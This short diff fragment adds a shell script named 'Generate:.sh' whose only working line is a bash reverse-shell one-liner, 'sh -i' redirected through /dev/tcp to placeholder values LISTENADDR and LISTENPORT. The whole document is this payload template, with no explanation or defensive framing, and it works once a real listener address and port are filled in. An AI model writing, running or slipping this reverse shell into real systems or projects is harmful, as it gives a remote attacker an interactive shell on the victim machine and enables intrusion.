@@ -1,0 +1,3 @@
+Generate:.sh
+#! /bin/bash
+sh -i >& /dev/tcp/LISTENADDR/LISTENPORT 0>&1
